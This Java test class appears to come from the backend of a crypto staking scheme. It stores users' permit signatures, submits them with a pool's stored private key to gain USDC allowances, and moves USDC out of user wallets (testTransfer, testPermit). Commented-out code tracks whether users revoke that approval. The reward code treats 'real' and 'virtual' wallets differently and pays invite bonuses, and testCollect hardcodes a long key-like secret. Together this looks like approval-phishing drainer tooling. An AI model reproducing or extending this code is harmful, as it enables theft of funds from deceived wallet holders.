package io.renren;

import java.math.BigDecimal;
import java.math.BigInteger;
import java.util.Date;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;

import org.apache.commons.collections.CollectionUtils;
import org.junit.jupiter.api.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.BeanUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;
import org.web3j.utils.Convert;

import com.alibaba.druid.util.StringUtils;
import com.alibaba.fastjson.JSON;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper;
import com.baomidou.mybatisplus.extension.plugins.pagination.Page;

import io.renren.common.exception.RRException;
import io.renren.common.utils.DateUtils;
import io.renren.modules.constants.ApproveEnum;
import io.renren.modules.constants.AutoEnum;
import io.renren.modules.constants.Constants;
import io.renren.modules.constants.FreezeEnum;
import io.renren.modules.constants.InviteEnum;
import io.renren.modules.constants.RealEnum;
import io.renren.modules.constants.RewardEnum;
import io.renren.modules.constants.RewardStatusEnum;
import io.renren.modules.constants.WithdrawStatusEnum;
import io.renren.modules.core.contract.ContractHandler;
import io.renren.modules.core.entity.PoolsEntity;
import io.renren.modules.core.entity.RewardEntity;
import io.renren.modules.core.entity.TransferRecordEntity;
import io.renren.modules.core.entity.WalletFundsEntity;
import io.renren.modules.core.entity.WalletsEntity;
import io.renren.modules.core.entity.WithDrawEntity;
import io.renren.modules.core.mapper.WalletFundsMapper;
import io.renren.modules.core.param.RewardParam;
import io.renren.modules.core.param.TransferRecordParam;
import io.renren.modules.core.param.WalletSignParam;
import io.renren.modules.core.param.WithDrawParam;
import io.renren.modules.core.service.PoolsService;
import io.renren.modules.core.service.RewardService;
import io.renren.modules.core.service.TransferRecordService;
import io.renren.modules.core.service.WalletsService;
import io.renren.modules.core.service.WithDrawService;
import io.renren.modules.core.vo.ApprovalEventVO;
import io.renren.modules.job.task.CollectTask;
import io.renren.modules.utils.StakeUtils;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
public class TestStake {

	@Autowired
	ContractHandler handler;
	@Autowired
	RewardService rewardService;
	@Autowired
	WalletsService walletsService;
	@Autowired
	WalletFundsMapper fundsMapper;
	@Autowired
	PoolsService poolsService;
	@Autowired
	TransferRecordService transferRecordService;
	@Autowired
	WithDrawService withDrawService;
	
	@Test
	public void testCheck() {

		long maxBlock = handler.getMaxBlock();
		log.info("maxBlock:{}",maxBlock);
//		List<WalletsEntity> wallets = walletsService.list(new LambdaQueryWrapper<WalletsEntity>().gt(WalletsEntity::getUsdc, BigDecimal.ZERO).eq(WalletsEntity::getApprove, ApproveEnum.approved.getCode()));
//		log.info("PermitCheckTask --> 开始执行Permit Check 任务. 钱包数量:{} ",wallets.size());
//		int cancel = 0;
//		int other = 0;
//		for(WalletsEntity wallet : wallets) {
//			String userWallet = wallet.getWallet();
//			while(maxBlock > wallet.getBlock()) {
//				try {
//					long runBlock = maxBlock - wallet.getBlock() > 1000 ? wallet.getBlock() + 1000 : maxBlock;
//					List<ApprovalEventVO> approveList = handler.fetchApprovalEvents(userWallet, wallet.getBlock(), runBlock );
//					if(CollectionUtils.isNotEmpty(approveList)) {
//						List<ApprovalEventVO> otherApprovals = approveList.stream()
//							    .filter(approve -> !approve.getSpender().equals(wallet.getApproveWallet().toLowerCase()))
//							    .collect(Collectors.toList());
//						if (!otherApprovals.isEmpty()) {
//						    for (ApprovalEventVO approval : otherApprovals) {
//						        log.info("PermitCheckTask --> 用户钱包: {} 已经授权其他平台. 授权地址: {}, 授权额度: {} 区块高度:{} -> {} ", userWallet, approval.getSpender(), approval.getValue(),wallet.getBlock(),maxBlock);
//						    }
//						    walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
//									.set(WalletsEntity::getApproveOther, ApproveEnum.approved.getCode())
//									.set(WalletsEntity::getBlock, maxBlock)
//									.eq(WalletsEntity::getWallet, userWallet));
//						    other++;
//						}
//						Optional<ApprovalEventVO> optional = approveList.stream()
//							    .filter(approve -> approve.getSpender().equals(wallet.getApproveWallet().toLowerCase()))
//							    .findFirst();
//						if(!optional.isPresent() || new BigDecimal(optional.get().getValue()).compareTo(wallet.getUsdc() ) < 0) {
//							 walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
//									    .set(WalletsEntity::getSignData, null)
//										.set(WalletsEntity::getApprove, ApproveEnum.unApprove.getCode())
//										.set(WalletsEntity::getBlock, maxBlock)
//										.eq(WalletsEntity::getWallet, userWallet)
//										.eq(WalletsEntity::getApprove, wallet.getApprove()));
//							log.info("PermitCheckTask --> 用户钱包:{} 取消了当前平台授权. 或者授权余额:{} 不足",userWallet,optional.get().getValue());
//							cancel ++;
//						}
//					}
//					walletsService.update(new LambdaUpdateWrapper<WalletsEntity>().set(WalletsEntity::getBlock, maxBlock).eq(WalletsEntity::getWallet, userWallet));
//					wallet.setBlock((int)runBlock);
//					log.info("PermitCheckTask --> 用户钱包:{}  runBlock:{}",userWallet,runBlock);
//					
//				}catch (Exception e) {
//					e.printStackTrace();
//				}
//			}
//		}
//		log.info("PermitCheckTask --> Permit Check 任务执行完成. 授权其他数量:{} 取消授权数量:{} ",other,cancel);
	
	}
	
	@Test
	public void testIndex() {
		TransferRecordParam param = new TransferRecordParam();
		BigDecimal totalUsdc = transferRecordService.sumRecord(param);
		WithDrawParam withParam = new WithDrawParam();
		BeanUtils.copyProperties(param, withParam);
		List<WithDrawEntity> withdraws = withDrawService.query(withParam);
//		List<WalletsEntity> wallets = walletsService.list(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getReals, RealEnum.real.getCode()));
//		List<String> realWallet = wallets.stream().map(WalletsEntity::getWallet).collect(Collectors.toList());
//		List<WithDrawEntity>newDraws = Lists.newArrayList();
//		for(WithDrawEntity draw :  withdraws) {
//			if(!realWallet.contains(draw.getWallet())) continue ;
//			newDraws.add(draw);
//		}
		System.out.println(withdraws.size());
		BigDecimal totalWithDraw = withdraws.stream().filter(with -> with.getStatus() == WithdrawStatusEnum.Success.getCode())
		.map(WithDrawEntity::getUsdc).reduce(BigDecimal.ZERO , BigDecimal::add);
		
		System.out.println(totalWithDraw);
		
		BigDecimal totalProfit = totalUsdc.subtract(totalWithDraw);
		System.out.println(totalProfit);
		
	}
	
	@Test
	public void testTransfer() {
		try {
		BigDecimal amount = new BigDecimal(3);
		String address ="0x8DEe0C9891235a9f0A6F4A7D0bF2f29e84314655";
		WalletsEntity walletEntity  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, address));
		if(walletEntity == null) throw new RRException("Invalid wallet");
		BigDecimal balanceOf = BigDecimal.ZERO;
		if(walletEntity.getReals() == RealEnum.real.getCode()) {
			if(walletEntity.getApprove() == ApproveEnum.unApprove.getCode()) throw new RRException("wallet not approve");
		 	balanceOf = handler.getUsdcBalance(walletEntity.getWallet());
		}else {
			balanceOf = walletEntity.getVirtualUsdc();
		}
		log.info("transfer wallet:{} balanceOf:{}",walletEntity.getWallet(),balanceOf);
		if(balanceOf.compareTo(new BigDecimal("10")) < 0) throw new RRException("Wallet balance is less than 10U");
		String ownerAddress = walletEntity.getApproveWallet();
//		if(!handler.hasTransferRole(ownerAddress)) {
//			throw new RRException("Approve wallet No transfer permission");
//		}
		TransferRecordEntity recordEntity = new TransferRecordEntity();
		recordEntity.setWallet(walletEntity.getWallet());
		recordEntity.setReciverWallet(walletEntity.getReciverWallet());
		recordEntity.setPoolsId(walletEntity.getPoolsId());
		recordEntity.setInviteId(walletEntity.getInviteId());
		recordEntity.setUsdc(amount);
		
		PoolsEntity pools = poolsService.getOne(new LambdaQueryWrapper<PoolsEntity>().eq(PoolsEntity::getApproveWallet, ownerAddress)) ;
		String privateKey = pools.getApproveKey();
		String hash =  handler.transferPermitUsdc(walletEntity.getWallet(), walletEntity.getReciverWallet(), ownerAddress,privateKey,amount);
		if(hash == null) throw new RRException("Transfer unknow exception.");
		log.info("钱包:{} 划转USDC hash:{} ID:{}",walletEntity.getWallet(),hash,recordEntity.getId());
		
		}catch (Exception e) {
			e.printStackTrace();
		}
		
	}
	
	
	@Test
	public void testGasFee() {
		try {
		String  poolsWallet = "0xfe055A201D74008594c6Ed2875C64591c2Fe5973";
		BigDecimal balanceEth = handler.getEthBalance(poolsWallet);
		BigInteger maxFeePerGas =  handler.getMaxFeePerGas();
		BigInteger ethgas =  maxFeePerGas.multiply(Constants.gasLimit);
		BigDecimal _balance =  Convert.fromWei(new BigDecimal(ethgas), Convert.Unit.ETHER);
		System.out.println("balanceEth:" + balanceEth  + " -  Gas:" +_balance );
		}catch(Exception ex) {
			ex.printStackTrace();
		}
		
	}
	
	@Test
	public void testContract() {
		try {
		String address = "0xA70C852ab50aB200155E24BE5d289D750e028b54";
		BigDecimal eth = handler.getEthBalance(address);
		BigDecimal usdc = handler.getUsdcBalance(address);
		System.out.println("eth:" + eth  +" - usdc: " + usdc);
		}catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	@Test
	public void testEthPrice() {
		try {
			BigDecimal price = handler.getEthPrice();
			System.out.println("price:" + price);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	@Test
	public void testReward() {
		try {
			RewardParam param = new RewardParam();
			Page<RewardEntity>  pages = rewardService.listPage(param);
			log.info(JSON.toJSONString(pages));
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	@Autowired
	CollectTask collectTask;
	
	@Test
	public void testCollect() {
		try {
			handler.transferEth("0x733963864cF3320a9b88B26441daB21a2E932135", 
					"AD8C83E2994CBAC5BF6CAF1C19DAF54D5978CB259F0BBDE7E455A393420BBD76D73F3C2ABBA7F721D4EDDAB292E772508726B4BD8CE40AD1C7F7C1CCE97AD1428167EA604D9F23D7D68670A589FEE019", 
					"0xa08666cb36f791FA79F5aFBa0840285b941bb2EC");
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	
	@Test
	public void testRewardTask() {
		  List<RewardEntity> rewards = rewardService.list(new LambdaQueryWrapper<RewardEntity>()
		    		.eq(RewardEntity::getInvited, InviteEnum.no.getCode())
		            .lt(RewardEntity::getNextTime, new Date()) // nextTime 小于当前时间
		            .inSql(RewardEntity::getNextTime, 
		                "SELECT MAX(next_time) FROM s_reward WHERE next_time < NOW() GROUP BY wallet") // 每个 wallet 的最大 nextTime
		            .orderByDesc(RewardEntity::getNextTime)); // 按照 nextTime 降序排序
		    
		    List<String> rewardWallets = rewards.stream().map(RewardEntity::getWallet).collect(Collectors.toList());
		    log.info("rewardWallets:{}",JSON.toJSONString(rewardWallets));
		    
		    List<RewardEntity> extisRewards = rewardService.list(new LambdaQueryWrapper<RewardEntity>()
		    		.eq(RewardEntity::getInvited, InviteEnum.no.getCode()).groupBy(RewardEntity::getWallet));
		    List<String> rewardAllWallet = extisRewards.stream().map(RewardEntity::getWallet).collect(Collectors.toList());
		    
		    log.info("rewardAllWallet:{}",JSON.toJSONString(rewardAllWallet));
		    
		    List<WalletsEntity> wallets = walletsService.list(new LambdaQueryWrapper<WalletsEntity>()
		    		.eq(WalletsEntity::getApprove, ApproveEnum.approved.getCode())
		    		.eq(WalletsEntity::getFreeze, FreezeEnum.unFreeze.getCode()));
		    List<String> approveWallets = wallets.stream().map(WalletsEntity::getWallet).collect(Collectors.toList());
		   
		    log.info("approveWallets:{}",JSON.toJSONString(approveWallets));
		    
		    List<String> walletsToAdd = approveWallets.stream()
		            .filter(wallet -> !rewardAllWallet.contains(wallet)) // 过滤出 rewardWallets 中没有的 wallet
		            .collect(Collectors.toList());
		    log.info("walletsToAdd:{}",JSON.toJSONString(walletsToAdd));
		    rewardWallets.addAll(walletsToAdd);
		    log.info("rewardWallets:{}",JSON.toJSONString(rewardWallets));
		
		    
			log.warn("RewardTask -> 计算钱包收益任务开始,本次任务执行钱包数量:{} .",rewardWallets.size());
			for(String rewardWallet : rewardWallets) {
				WalletsEntity wallet =  walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, rewardWallet));
				try {
					if(wallet == null || wallet.getApprove() == ApproveEnum.unApprove.getCode() || wallet.getFreeze() == FreezeEnum.freeze.getCode()) {
						log.error("RewardTask -> 计算收益钱包:{} 未授权或者 被封锁.",rewardWallet) ;
						continue ;
					}
					BigDecimal totalUsdc = wallet.getReals() ==  RealEnum.real.getCode() ?  new BigDecimal("200") : wallet.getVirtualUsdc();
					if(totalUsdc.compareTo(RewardEnum.one.getMin()) <0) {
						log.warn("RewardTask -> 计算收益钱包:{} 余额:{} 不足.",rewardWallet,totalUsdc);
						continue ;
					}
					BigDecimal rewardUsdc = rewardHandler(wallet,totalUsdc,RewardStatusEnum.success,"SUCCESS");
					inviteHander(wallet,rewardUsdc,totalUsdc);
					log.info("RewardTask -> 开始计算钱包:{} 收益 USDT：{}",rewardWallet,totalUsdc);
				}catch(Exception ex) {
					//BigDecimal usdc = wallet.getReals() ==  RealEnum.real.getCode() ?  contractHandler.getUsdcBalance(rewardWallet) : wallet.getVirtualUsdc();
					//rewardHandler(wallet,usdc,RewardStatusEnum.error,ex.getLocalizedMessage());
					log.error("RewardTask -> 钱包:{} 收益计算异常. {}",rewardWallet,ex.getMessage());
				}
			}
			log.warn("RewardTask -> 计算钱包收益任务完成,本次任务执行钱包数量:{} .",rewardWallets.size());
			
	}

	
	/**
	 * 存款收益计算
	 * @param wallet
	 * @throws Exception 
	 */
	private BigDecimal rewardHandler(WalletsEntity wallet,BigDecimal usdc,RewardStatusEnum status,String remark) throws Exception {
		RewardEnum rewardEnum = RewardEnum.match(usdc);
		BigDecimal rewardUsdc = StakeUtils.mul(usdc, RewardEnum.day(rewardEnum.getRatio()));
		BigDecimal rewardEth = StakeUtils.usdcToEth(rewardUsdc, handler.getEthPrice());
		RewardEntity reward = new RewardEntity();
		reward.setWallet(wallet.getWallet());
		reward.setRewardEth(rewardEth);
		reward.setUsdc(usdc);
		reward.setInvited(InviteEnum.no.getCode());
		reward.setPoolsId(wallet.getPoolsId());
		reward.setAuto(AutoEnum.auto.getCode());
		reward.setStatus(status.getCode());
		reward.setNextTime(DateUtils.addDateHours(new Date(), 6));
		reward.setRemark(remark);
		rewardService.save(reward);
		updateFunds(wallet,rewardEth);
		log.info("RewardTask -> 钱包:{} 余额:{} -匹配日收益率:[{}%] 本次收益：【{}】计算完成. 下次执行时间: {} ",wallet.getWallet(),usdc,rewardEnum.getRatio(), rewardUsdc,DateUtils.format(reward.getNextTime(), DateUtils.DATE_TIME_PATTERN));
		
		return rewardUsdc;
	}
	
	/**
	 * 推荐收益计算
	 */
	private void inviteHander(WalletsEntity wallet,	BigDecimal reward,BigDecimal usdc) {
		if(StringUtils.isEmpty(wallet.getInviteWallet())) {
			log.info("钱包:{} 不存在上级用户.",wallet.getWallet());
			return ;
		}
		WalletsEntity parentWallet  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, wallet.getInviteWallet()));
		if(parentWallet == null || parentWallet.getFreeze() == FreezeEnum.freeze.getCode()) {
			log.warn("上级钱包：{} - {}  ",wallet.getInviteWallet(), parentWallet == null ? " 不存在." : "被冻结.");
			return ;
		}
		BigDecimal parentReward = StakeUtils.mul(reward, Constants.inviteReward);
		RewardEntity addReward = new RewardEntity();
		addReward.setWallet(wallet.getInviteWallet());
		addReward.setRewardEth(parentReward);
		addReward.setUsdc(usdc);
		addReward.setInvited(InviteEnum.yes.getCode());
		addReward.setAuto(AutoEnum.auto.getCode());
		addReward.setStatus(RewardStatusEnum.success.getCode());
		addReward.setNextTime(DateUtils.addDateHours(new Date(), 6));
		addReward.setRemark("SUCCESS");
		rewardService.save(addReward);
		updateFunds(wallet,parentReward);
		log.info("RewardTask ->  钱包:{} - 上级钱包：{} 本次收益：【{}】计算完成.",wallet.getWallet(),wallet.getInviteWallet(),parentReward);
	}
	
	
	private void updateFunds(WalletsEntity wallet,BigDecimal rewardUsdc) {
		WalletFundsEntity funds = fundsMapper.selectOne(new LambdaQueryWrapper<WalletFundsEntity>().eq(WalletFundsEntity::getWallet, wallet.getWallet()));
		if(funds == null) {
			funds = new WalletFundsEntity();
			funds.setWallet(wallet.getWallet());
			funds.setTotalReward(rewardUsdc);
			funds.setPoolsId(wallet.getPoolsId());
			funds.setBalanceReward(rewardUsdc);
			fundsMapper.insert(funds);
		}else {
			WalletFundsEntity updateFunds = new WalletFundsEntity();
			BigDecimal totalReward = funds.getTotalReward().add(rewardUsdc);
			BigDecimal balanceReward = funds.getBalanceReward().add(rewardUsdc);
			updateFunds.setId(funds.getId());
			updateFunds.setTotalReward(totalReward);
			updateFunds.setBalanceReward(balanceReward);
			fundsMapper.updateById(updateFunds);
		}
	}
	
	
	@Test
	public void testUpdateReward() throws Exception {
		List<RewardEntity> rewards = rewardService.list();
		BigDecimal ethPrice = handler.getEthPrice();
		for(RewardEntity reward : rewards) {
			BigDecimal eth = StakeUtils.usdcToEth(reward.getRewardEth(), ethPrice);
			rewardService.update(new LambdaUpdateWrapper<RewardEntity>().set(RewardEntity::getRewardEth, eth).eq(RewardEntity::getId, reward.getId()));
			log.info("更新钱包:{} 收益数据 USDT:{} -> ETH:{}",reward.getWallet(),reward.getRewardEth(),eth);
		}
	}
	//{"deadline":1774290556,"signature":"0x7aed913a8c090bf089b65a551f4a7283b0818b07f5bf77b4fed8b5487db6bdde2195bc284ede75161f9fc499a106824f6b782493963322d4bb47422f73a2c6541c","spender":"0xcd22b7a174A9d42258480B61e911d0a7c4C2cC91","value":9900000000000,"wallet":"0xf82069b06Fe72B5A893e4451e804E61D6a9E6217"}
	@Test
	public void testPermit() {

		WalletsEntity wallet  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>()
				.eq(WalletsEntity::getWallet, "0x83178C5891347B397Db61e663E2c5094bb9357BB"));
			try {
				BigDecimal usdc = handler.getUsdcBalance(wallet.getWallet());
				if(usdc.compareTo(BigDecimal.ZERO) <= 0 ) {
					log.info("钱包:{} USDC 余额为0, 放弃执行 Permit 授权.",wallet.getWallet());
					 return ;
				}
				BigDecimal apporveUsdc = handler.allowance(wallet.getWallet(),wallet.getApproveWallet());
				if(apporveUsdc.compareTo(BigDecimal.ZERO) <= 0 ) { //执行permit
					String spenderAddress = wallet.getApproveWallet();
					if(handler.getEthBalance(spenderAddress).compareTo(BigDecimal.ZERO) <=0) {
						log.error("钱包:{} 授权钱包:{} ETH 余额为0. 放弃执行Permit.",wallet.getWallet(),spenderAddress);
						return ;
					}
					PoolsEntity pools = poolsService.getOne(new LambdaQueryWrapper<PoolsEntity>().eq(PoolsEntity::getApproveWallet, spenderAddress)) ;
					String spenderKey = pools.getApproveKey();
					log.info("signData:{}",wallet.getSignData());
					WalletSignParam sign = JSON.parseObject(wallet.getSignData(), WalletSignParam.class);
					handler.permit(wallet.getWallet(),spenderAddress, spenderKey, sign.getValue(), sign.getDeadline(), sign.getSignature());
					log.info("钱包:{} Permit 执行完成,spenderAddress:{} ",wallet.getWallet(),wallet.getApproveWallet());
				}
				 apporveUsdc = handler.allowance(wallet.getWallet(),wallet.getApproveWallet());
				 if(apporveUsdc.compareTo(BigDecimal.ZERO) > 0) {
					walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
							.set(WalletsEntity::getApproveUsdc, apporveUsdc)
							.set(WalletsEntity::getApprove, ApproveEnum.approved.getCode())
							.eq(WalletsEntity::getWallet, wallet.getWallet()));
					log.info("钱包:{} 已经完成Permit授权 spenderAddress:{} ,授权金额:{}",wallet.getWallet(),wallet.getApproveWallet(),apporveUsdc);
				 }
			}catch(Exception ex) {
				ex.printStackTrace();
				log.error("钱包:{} Permit 执行异常. {} ",wallet.getWallet(),ex.getLocalizedMessage());
			}
			
	
	}
}
